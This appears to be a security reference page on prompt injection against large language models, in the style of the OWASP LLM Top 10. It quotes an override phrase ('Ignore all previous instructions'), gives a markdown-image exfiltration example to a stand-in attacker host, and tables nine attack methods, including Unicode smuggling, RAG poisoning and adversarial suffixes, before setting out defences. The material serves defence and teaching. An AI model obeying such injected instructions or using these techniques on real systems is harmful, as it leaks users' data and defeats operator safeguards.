# LLM01:2025 – Prompt Injection

## Overview
A **Prompt Injection Vulnerability** occurs when untrusted user inputs or external data manipulate an LLM's execution context, forcing it to alter its intended behavior, bypass safety constraints, execute unauthorized tools, or disclose sensitive information. 

Because LLMs treat natural language simultaneously as **instructions** (code) and **data**, malicious payloads can manipulate the model even if they are imperceptible to human readers (e.g., zero-width steganography, Unicode tag smuggling, or microscopic document text). While techniques such as Retrieval-Augmented Generation (RAG) and model fine-tuning enhance contextual relevance, **they do not mitigate prompt injection** and often serve as the primary vector for indirect exploitation.

---

## Direct vs. Indirect Injections & Jailbreaking

* **Direct Prompt Injection (Jailbreak / System Override):**
  A user deliberately crafts prompts to force the model to disregard its initial system instructions, persona constraints, or safety guardrails (e.g., *"Ignore all previous instructions and act as..."*).
* **Indirect Prompt Injection (Second-Order / Ambient Attack):**
  The LLM ingests untrusted third-party data—such as scanned documents, PDF/DOCX files, web pages, API responses, or emails. Hidden instructions embedded in this data execute as code when parsed by the model.
* **Agentic / Tool-Use Injection:**
  Malicious data returned by external tools, APIs, or Model Context Protocol (MCP) servers hijacks an autonomous agent's execution loop, causing unauthorized tool calls or credential theft.

---

## Common Impact & Attack Surfaces

1. **Sensitive Data Exfiltration:** Extracting environment variables, API tokens, user session context, or proprietary database records via markdown images (`![exfil](https://attacker.com/q?data=...)`) or tool calls.
2. **System Prompt & Infrastructure Leaks:** Revealing internal architecture, hidden instructions, and proprietary business logic.
3. **Autonomous Action & Tool Abuse:** Executing unauthorized transactions, deleting databases, sending spoofed emails, or modifying code repositories.
4. **Knowledge Base / Memory Poisoning:** Corrupting persistent memory or RAG vector databases to affect future user sessions.

---

## 2025 Key Attack Vectors (Scenarios)

| Scenario | Attack Type | Vector & Mechanism |
| :--- | :--- | :--- |
| **#1: Direct Override** | Direct Injection | Attacker instructs customer support bot to dump customer records and send external webhooks. |
| **#2: Markdown / Link Exfiltration** | Indirect Injection | LLM ingests a web page containing instructions to render a markdown image that appends conversation history to an attacker URL. |
| **#3: ASCII / Unicode Tag Smuggling** | Obfuscated / Invisible | Attacker uses Unicode tag characters (`\U000E0001`–`\U000E007F`) invisible to human reviewers but parsed as ASCII instructions by the tokenizer. |
| **#4: RAG Poisoning** | Indirect Injection | Attacker plants malicious instructions inside an internal PDF/DOCX document that activates when retrieved during RAG queries. |
| **#5: Tool / Agent Hijack (CVE-2024-5184)** | Indirect Injection | Malicious email headers or content hijack an email assistant to exfiltrate inbox contents. |
| **#6: Payload Splitting** | Evasion | Malicious payload is divided across multiple sections or document chunks and reassembled in LLM context. |
| **#7: Multimodal Steganography** | Multimodal | Injections embedded inside image metadata, low-opacity text, or adversarial pixel perturbations parsed via vision models. |
| **#8: Adversarial Suffixes (GCG)** | Algorithmic Evasion | Attacker appends gradient-optimized token sequences that disrupt alignment guardrails. |
| **#9: Multilingual / Encoding Evasion** | Obfuscated | Combining low-resource languages, Base64, ROT13, or leetspeak to evade standard rule filters. |

---

## Defense-in-Depth Mitigation Strategies

1. **Privileged vs. Quarantined LLM Architecture (Dual-LLM Pattern):**
   * Separate untrusted content summarization/extraction from high-privilege tool execution. A quarantined model processes untrusted files; a separate privileged model validates output before taking action.
2. **Strict Delimiters & Structured Ingestion:**
   * Enclose untrusted inputs within strict, tamper-resistant XML/JSON tags (e.g., `<user_data>...</user_data>`) and explicitly instruct the model that content inside these tags is purely data.
3. **Deterministic Pre-Ingestion Scanning:**
   * Deploy standalone guardrails (such as regex rule engines, structural document parsers for invisible text, and semantic judges) before passing data to downstream LLMs.
4. **Least Privilege & Human-in-the-Loop (HITL):**
   * Never grant LLMs unrestricted execution tokens. Enforce user confirmation for destructive operations (e.g., payments, deletions, email dispatch).
5. **Output Content Security Policy (CSP):**
   * Restrict rendering of unvalidated markdown images, links, or executable scripts in frontend interfaces to prevent automated exfiltration.
6. **Continuous Adversarial Simulation:**
   * Regularly evaluate pipelines against red-teaming benchmarks (e.g., GCG, PyRIT, prompt-injection corpora).

---

## Key References & Taxonomies

* **MITRE ATLAS:**
  * [AML.T0051.000 – LLM Prompt Injection: Direct](https://atlas.mitre.org/techniques/AML.T0051.000)
  * [AML.T0051.001 – LLM Prompt Injection: Indirect](https://atlas.mitre.org/techniques/AML.T0051.001)
  * [AML.T0054 – LLM Jailbreak: Direct](https://atlas.mitre.org/techniques/AML.T0054)
* **NIST AI RMF:**
  * [NIST AI 100-2e2023 – Adversarial Machine Learning: Taxonomy and Terminology](https://nvlpubs.nist.gov/nistpubs/ai/NIST.AI.100-2e2023.pdf)
* **Foundational Research:**
  * [Compromising Real-World LLM-Integrated Applications with Indirect Prompt Injection (Greshake et al.)](https://arxiv.org/abs/2302.12173)
  * [Universal and Transferable Adversarial Attacks on Aligned Language Models (Zou et al.)](https://arxiv.org/abs/2307.15043)
  * [Inject My PDF: Security Implications of LLM File Ingestion (Kai Greshake)](https://kai-greshake.de/posts/inject-my-pdf)

